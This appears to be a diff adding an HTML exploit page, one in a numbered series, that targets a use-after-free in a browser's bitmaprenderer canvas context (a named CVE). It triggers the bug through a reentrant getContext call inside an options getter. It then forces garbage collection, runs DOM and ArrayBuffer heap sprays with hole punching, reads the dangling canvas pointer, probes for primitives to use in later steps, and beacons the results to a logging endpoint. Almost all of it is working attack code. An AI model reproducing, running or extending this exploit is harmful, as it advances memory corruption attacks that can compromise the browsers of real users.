@@ -1,0 +1,455 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p635l</title></head>
+<body><pre id="out">p635l: bmr dangling pointer — orphan canvas + GC + spray reclaim</pre>
+<script>
+'use strict';
+/*
+  p635l: CVE-2026-43720 — exploit bmr dangling canvas pointer via heap spray
+  -- prior art: p635h confirmed bmr.canvas CRASH (dangling CanvasBase& ref)
+  -- prior art: p635i confirmed tfib(null) OK, tfib(bitmap) CRASH
+  -- prior art: p635d confirmed Canvas2D backing in bmalloc/libpas zone
+
+  CRASH_CLASS: HIGH — Phase B/C intentionally access dangling pointer
+
+  Strategy:
+  A) Deep bmr introspection WITHOUT accessing .canvas
+  B) Orphan canvas element (null all JS refs except bmr), GC, spray, then
+     access bmr.canvas — if GC freed the canvas and spray reclaimed it,
+     bmr.canvas reads controlled data instead of SEGV
+  C) Alternative: spray DOM nodes of similar size to HTMLCanvasElement before
+     trigger, create holes, trigger UAF, then access bmr.canvas
+  D) ArrayBuffer spray at multiple size classes + bmr.canvas
+*/
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function bk(tag, d) {
+  var msg = 'P635L-' + tag + (d !== undefined ? '-' + String(d).slice(0, 800) : '');
+  say(msg);
+  try {
+    var x = new XMLHttpRequest();
+    x.open('POST', '/api/beacon', false);
+    x.setRequestHeader('Content-Type', 'application/json');
+    x.send(JSON.stringify({stage:'p635l', msg:msg, level:'info', sid:'p635l-'+Date.now(), ua:navigator.userAgent}));
+  } catch(e) {
+    try { new Image().src = '/beacon?m=' + encodeURIComponent(msg) + '&t=' + Date.now(); } catch(e2) {}
+  }
+}
+
+function f64hex(v) {
+  try {
+    var buf = new ArrayBuffer(8);
+    new Float64Array(buf)[0] = v;
+    var u = new Uint32Array(buf);
+    return ((u[1] >>> 0).toString(16)).padStart(8, '0') + ((u[0] >>> 0).toString(16)).padStart(8, '0');
+  } catch(e) { return 'ERR'; }
+}
+
+function isPointerLike(hi) {
+  return (hi >= 0xFFFF8000 && hi < 0xFFFFFFFF)
+      || (hi >= 0x7F000000 && hi <= 0x7FFFFFFF)
+      || (hi >= 0x00007F00 && hi <= 0x00007FFF)
+      || (hi >= 0x00000001 && hi <= 0x0000FFFF);
+}
+
+function forceGC() {
+  // Aggressive GC pressure: allocate + discard large objects
+  for (var r = 0; r < 5; r++) {
+    var trash = [];
+    for (var i = 0; i < 2000; i++) {
+      trash.push(new ArrayBuffer(4096));
+    }
+    trash = null;
+  }
+  try { if (typeof gc === 'function') gc(); } catch(e) {}
+}
+
+bk('START', navigator.userAgent);
+
+// ================================================================
+// PHASE A: Deep bmr introspection (NO .canvas access, safe)
+// ================================================================
+bk('A-START', 'bmr introspection');
+
+var bmrA = null;
+var innerA = null;
+var canvasA = document.createElement('canvas');
+canvasA.width = 64; canvasA.height = 64;
+
+var optsA = {};
+Object.defineProperty(optsA, 'alpha', {
+  get: function() { innerA = canvasA.getContext('2d'); return true; }
+});
+try {
+  bmrA = canvasA.getContext('bitmaprenderer', optsA);
+} catch(e) { bk('A-TRIGGER', 'ERR:' + e.message); }
+
+bk('A-TRIGGER', 'inner=' + !!innerA + ' bmr=' + !!bmrA);
+
+if (bmrA) {
+  // Constructor and prototype info
+  try {
+    bk('A-CTOR', bmrA.constructor.name);
+  } catch(e) { bk('A-CTOR', 'ERR'); }
+
+  try {
+    var proto = Object.getPrototypeOf(bmrA);
+    var names = Object.getOwnPropertyNames(proto);
+    bk('A-PROTO', names.join(','));
+  } catch(e) { bk('A-PROTO', 'ERR'); }
+
+  // Property descriptors — DO NOT invoke getters
+  try {
+    var proto2 = Object.getPrototypeOf(bmrA);
+    var cd = Object.getOwnPropertyDescriptor(proto2, 'canvas');
+    bk('A-CANVAS-DESC', 'get=' + typeof cd.get + ' set=' + typeof cd.set + ' enum=' + cd.enumerable + ' conf=' + cd.configurable);
+  } catch(e) { bk('A-CANVAS-DESC', 'ERR:' + e.message.slice(0,40)); }
+
+  try {
+    var td = Object.getOwnPropertyDescriptor(proto2, 'transferFromImageBitmap');
+    bk('A-TFIB-DESC', 'val=' + typeof td.value + ' enum=' + td.enumerable);
+  } catch(e) { bk('A-TFIB-DESC', 'ERR'); }
+
+  // instanceof checks
+  try {
+    bk('A-INST', 'bmr instanceof Object=' + (bmrA instanceof Object));
+  } catch(e) {}
+
+  // Re-getContext on same canvas
+  try {
+    var reget2d = canvasA.getContext('2d');
+    bk('A-REGET-2D', reget2d === innerA ? 'SAME-INNER' : (reget2d ? 'DIFF' : 'NULL'));
+  } catch(e) { bk('A-REGET-2D', 'ERR:' + e.message.slice(0,40)); }
+
+  try {
+    var regetBmr = canvasA.getContext('bitmaprenderer');
+    bk('A-REGET-BMR', regetBmr === bmrA ? 'SAME-BMR' : (regetBmr ? 'DIFF' : 'NULL'));
+  } catch(e) { bk('A-REGET-BMR', 'ERR:' + e.message.slice(0,40)); }
+
+  // toDataURL on the canvas (goes through active context, NOT bmr.canvas getter)
+  try {
+    var url = canvasA.toDataURL('image/png');
+    bk('A-DATAURL', 'len=' + url.length + ' hdr=' + url.slice(0,30));
+  } catch(e) { bk('A-DATAURL', 'ERR:' + e.message.slice(0,40)); }
+
+  // Canvas width/height through element
+  try {
+    bk('A-SIZE', 'w=' + canvasA.width + ' h=' + canvasA.height);
+  } catch(e) { bk('A-SIZE', 'ERR'); }
+
+  // getImageData through inner (should work)
+  try {
+    var px = innerA.getImageData(0, 0, 1, 1);
+    bk('A-PIXELS', 'px[0]=' + px.data[0]+','+px.data[1]+','+px.data[2]+','+px.data[3]);
+  } catch(e) { bk('A-PIXELS', 'ERR:' + e.message.slice(0,40)); }
+}
+
+bk('A-DONE', 'survived');
+
+// ================================================================
+// PHASE B: Orphan canvas + GC + spray → bmr.canvas
+// The hypothesis: m_canvas is a raw C++ reference (CanvasBase&),
+// not preventing GC. If we null all JS refs to the canvas element,
+// GC might collect it. Spray to reclaim. bmr.canvas reads controlled data.
+// ================================================================
+bk('B-START', 'orphan+GC+spray');
+
+var bmrB = null;
+
+// Scope to ensure canvas/inner refs are truly dropped
+(function() {
+  var cv = document.createElement('canvas');
+  cv.width = 64; cv.height = 64;
+  // Do NOT append to DOM (no parent ref)
+  var inner = null;
+  var opts = {};
+  Object.defineProperty(opts, 'alpha', {
+    get: function() { inner = cv.getContext('2d'); return true; }
+  });
+  bmrB = cv.getContext('bitmaprenderer', opts);
+  bk('B-TRIGGER', 'inner=' + !!inner + ' bmr=' + !!bmrB);
+  // Null all refs to canvas and inner
+  inner = null;
+  cv = null;
+  opts = null;
+})();
+
+if (bmrB) {
+  // Aggressive GC
+  bk('B-GC', 'forcing collection');
+  forceGC();
+  // Small delay for GC sweeps
+  var gcStart = Date.now();
+  while (Date.now() - gcStart < 100) {} // spin 100ms
+
+  // Spray multiple size classes to reclaim freed HTMLCanvasElement
+  // HTMLCanvasElement is a DOM node — try DOM node spray
+  bk('B-SPRAY', 'spraying DOM + AB');
+  var sprayDom = [];
+  var sprayAB = [];
+
+  // DOM spray: elements of similar size to HTMLCanvasElement
+  for (var i = 0; i < 3000; i++) {
+    var el = document.createElement('canvas');
+    el.width = 64; el.height = 64;
+    el.setAttribute('data-marker', 'BMR' + i);
+    sprayDom.push(el);
+  }
+
+  // ArrayBuffer spray at multiple size classes
+  var sizes = [64, 128, 192, 256, 320, 384, 448, 512, 768, 1024];
+  for (var si = 0; si < sizes.length; si++) {
+    for (var j = 0; j < 500; j++) {
+      var ab = new ArrayBuffer(sizes[si]);
+      var u32 = new Uint32Array(ab);
+      // Fill with identifiable pattern: size class marker + index
+      u32[0] = 0xDEAD0000 | si;
+      u32[1] = j;
+      if (u32.length > 2) u32[2] = 0xBEEFCAFE;
+      if (u32.length > 3) u32[3] = sizes[si];
+      sprayAB.push(ab);
+    }
+  }
+
+  bk('B-SPRAY-DONE', 'dom=' + sprayDom.length + ' ab=' + sprayAB.length);
+
+  // THE CRITICAL ACCESS — bmr.canvas
+  bk('B-ACCESS', 'about to read bmr.canvas');
+  try {
+    var c = bmrB.canvas;
+    // If we get here, the dangling pointer was reclaimed!
+    bk('B-WIN', 'type=' + typeof c);
+    if (c) {
+      try { bk('B-WIN-TAG', c.tagName || 'no-tagName'); } catch(e2) { bk('B-WIN-TAG', 'ERR:' + e2.message.slice(0,40)); }
+      try { bk('B-WIN-ID', c.id || 'no-id'); } catch(e2) {}
+      try { bk('B-WIN-ATTR', c.getAttribute ? c.getAttribute('data-marker') : 'no-getAttribute'); } catch(e2) { bk('B-WIN-ATTR', 'ERR'); }
+      try { bk('B-WIN-WH', 'w=' + c.width + ' h=' + c.height); } catch(e2) {}
+      try { bk('B-WIN-OUT', c.outerHTML ? c.outerHTML.slice(0,100) : 'no-outerHTML'); } catch(e2) { bk('B-WIN-OUT', 'ERR'); }
+    } else {
+      bk('B-WIN-NULL', 'canvas returned null/undefined');
+    }
+  } catch(e) {
+    bk('B-ERR', e.message.slice(0,60));
+  }
+  bk('B-SURVIVED', 'no crash');
+}
+
+bk('B-DONE', 'phase B complete');
+
+// ================================================================
+// PHASE C: Pre-fill heap + hole punch + trigger + bmr.canvas
+// Different from B: here we shape the heap BEFORE trigger
+// ================================================================
+bk('C-START', 'heap shaping before trigger');
+
+// Step 1: Fill heap with canvases of matching size
+var padding = [];
+for (var i = 0; i < 2000; i++) {
+  var pc = document.createElement('canvas');
+  pc.width = 64; pc.height = 64;
+  pc.setAttribute('data-pad', 'C' + i);
+  padding.push(pc);
+}
+
+// Step 2: Punch holes (free alternating)
+for (var i = 0; i < padding.length; i += 2) {
+  padding[i] = null;
+}
+forceGC();
+
+// Step 3: Trigger UAF — the canvas element should land in a hole
+var bmrC = null;
+(function() {
+  var cv = document.createElement('canvas');
+  cv.width = 64; cv.height = 64;
+  var inner = null;
+  var opts = {};
+  Object.defineProperty(opts, 'alpha', {
+    get: function() { inner = cv.getContext('2d'); return true; }
+  });
+  bmrC = cv.getContext('bitmaprenderer', opts);
+  bk('C-TRIGGER', 'bmr=' + !!bmrC);
+  // Keep reference to bmr only
+  inner = null;
+  cv = null;
+})();
+
+if (bmrC) {
+  // More GC
+  forceGC();
+  var gcStart2 = Date.now();
+  while (Date.now() - gcStart2 < 200) {}
+
+  // Fill holes with pattern-marked canvases
+  for (var i = 0; i < padding.length; i += 2) {
+    var fc = document.createElement('canvas');
+    fc.width = 64; fc.height = 64;
+    fc.setAttribute('data-fill', 'F' + i);
+    padding[i] = fc;
+  }
+
+  bk('C-ACCESS', 'about to read bmr.canvas');
+  try {
+    var c = bmrC.canvas;
+    bk('C-WIN', 'type=' + typeof c);
+    if (c) {
+      try { bk('C-WIN-MARKER', c.getAttribute ? c.getAttribute('data-fill') || c.getAttribute('data-pad') || 'none' : 'N/A'); } catch(e2) { bk('C-WIN-MARKER', 'ERR'); }
+      try { bk('C-WIN-TAG', c.tagName); } catch(e2) {}
+    }
+  } catch(e) {
+    bk('C-ERR', e.message.slice(0,60));
+  }
+  bk('C-SURVIVED', 'no crash');
+}
+
+bk('C-DONE', 'phase C complete');
+
+// ================================================================
+// PHASE D: Check capabilities for next steps
+// ================================================================
+bk('D-START', 'capability scan');
+
+try { bk('D-WASM', typeof WebAssembly); } catch(e) { bk('D-WASM', 'absent'); }
+try { bk('D-WORKER', typeof Worker); } catch(e) { bk('D-WORKER', 'absent'); }
+try { bk('D-SAB', typeof SharedArrayBuffer); } catch(e) { bk('D-SAB', 'absent'); }
+try { bk('D-ATOMICS', typeof Atomics); } catch(e) { bk('D-ATOMICS', 'absent'); }
+try { bk('D-MSGCH', typeof MessageChannel); } catch(e) { bk('D-MSGCH', 'absent'); }
+try { bk('D-PERF', typeof performance.now === 'function' ? 'res=' + (performance.now() % 1 !== 0 ? 'sub-ms' : 'ms') : 'absent'); } catch(e) { bk('D-PERF', 'absent'); }
+try { bk('D-WEAKREF', typeof WeakRef); } catch(e) { bk('D-WEAKREF', 'absent'); }
+try { bk('D-FINREG', typeof FinalizationRegistry); } catch(e) { bk('D-FINREG', 'absent'); }
+
+// Test if Worker actually works (create inline worker)
+try {
+  var blob = new Blob(['postMessage("alive")'], {type:'application/javascript'});
+  var wurl = URL.createObjectURL(blob);
+  var w = new Worker(wurl);
+  var workerAlive = false;
+  w.onmessage = function(e) {
+    workerAlive = true;
+    bk('D-WORKER-ALIVE', e.data);
+    w.terminate();
+  };
+  w.onerror = function(e) { bk('D-WORKER-ERR', e.message ? e.message.slice(0,40) : 'unknown'); };
+  // Wait briefly
+  var wstart = Date.now();
+  while (Date.now() - wstart < 500 && !workerAlive) {}
+  if (!workerAlive) bk('D-WORKER-TIMEOUT', 'no response in 500ms');
+} catch(e) { bk('D-WORKER-CREATE', 'ERR:' + e.message.slice(0,40)); }
+
+// Test WeakRef + FinalizationRegistry for detecting canvas collection
+try {
+  if (typeof WeakRef !== 'undefined' && typeof FinalizationRegistry !== 'undefined') {
+    var collected = false;
+    var fr = new FinalizationRegistry(function(val) {
+      collected = true;
+      bk('D-FR-COLLECTED', val);
+    });
+    (function() {
+      var testObj = document.createElement('canvas');
+      fr.register(testObj, 'test-canvas');
+      // testObj goes out of scope
+    })();
+    forceGC();
+    var frStart = Date.now();
+    while (Date.now() - frStart < 300) {}
+    bk('D-FR-STATUS', collected ? 'COLLECTED' : 'not-collected-yet');
+  }
+} catch(e) { bk('D-FR', 'ERR:' + e.message.slice(0,40)); }
+
+bk('D-DONE', 'survived');
+
+// ================================================================
+// PHASE E: Use FinalizationRegistry to CONFIRM canvas GC, then spray
+// Only runs if WeakRef/FR are available
+// ================================================================
+bk('E-START', 'FR-monitored orphan');
+
+if (typeof WeakRef !== 'undefined' && typeof FinalizationRegistry !== 'undefined') {
+  var canvasCollected = false;
+  var bmrE = null;
+  var wrE = null;
+
+  var frE = new FinalizationRegistry(function(val) {
+    canvasCollected = true;
+    bk('E-CANVAS-FREED', val);
+  });
+
+  (function() {
+    var cv = document.createElement('canvas');
+    cv.width = 64; cv.height = 64;
+    wrE = new WeakRef(cv);
+    frE.register(cv, 'uaf-canvas');
+    var inner = null;
+    var opts = {};
+    Object.defineProperty(opts, 'alpha', {
+      get: function() { inner = cv.getContext('2d'); return true; }
+    });
+    bmrE = cv.getContext('bitmaprenderer', opts);
+    bk('E-TRIGGER', 'bmr=' + !!bmrE + ' inner=' + !!inner);
+    inner = null;
+    cv = null;
+  })();
+
+  if (bmrE) {
+    // Check WeakRef before GC
+    bk('E-WR-PRE', wrE.deref() ? 'alive' : 'dead');
+
+    // Force GC aggressively
+    for (var round = 0; round < 10; round++) {
+      forceGC();
+      var waitStart = Date.now();
+      while (Date.now() - waitStart < 50) {}
+    }
+
+    // Check WeakRef after GC
+    var postDeref = wrE.deref();
+    bk('E-WR-POST', postDeref ? 'STILL-ALIVE' : 'COLLECTED');
+
+    if (!postDeref) {
+      // Canvas was collected! Now spray to reclaim its memory
+      bk('E-SPRAY', 'canvas collected, spraying');
+      var sprayE = [];
+      // Spray with canvases (same bmalloc size class)
+      for (var i = 0; i < 5000; i++) {
+        var sc = document.createElement('canvas');
+        sc.width = 64; sc.height = 64;
+        sc.id = 'spray-' + i;
+        sc.setAttribute('data-e', 'E' + i);
+        sprayE.push(sc);
+      }
+
+      bk('E-ACCESS', 'about to read bmr.canvas after confirmed GC');
+      try {
+        var c = bmrE.canvas;
+        bk('E-WIN', 'TYPE=' + typeof c);
+        if (c) {
+          try { bk('E-WIN-ID', c.id || 'no-id'); } catch(e2) {}
+          try { bk('E-WIN-TAG', c.tagName); } catch(e2) {}
+          try { bk('E-WIN-MARKER', c.getAttribute('data-e')); } catch(e2) {}
+          // This would be the info leak:
+          // Reading properties of the fake canvas reveals heap layout
+          try {
+            var ctx = c.getContext('2d');
+            if (ctx) {
+              bk('E-WIN-CTX', 'GOT 2D CONTEXT ON RECLAIMED CANVAS');
+            }
+          } catch(e3) {}
+        }
+      } catch(e) {
+        bk('E-ERR', e.message.slice(0,60));
+      }
+      bk('E-SURVIVED', 'no crash');
+    } else {
+      bk('E-SKIP', 'canvas not collected, bmr prevents GC');
+    }
+  }
+} else {
+  bk('E-SKIP', 'no WeakRef/FR');
+}
+
+bk('E-DONE', 'phase E complete');
+
+bk('DONE', 'all phases complete');
+</script>
+</body></html>
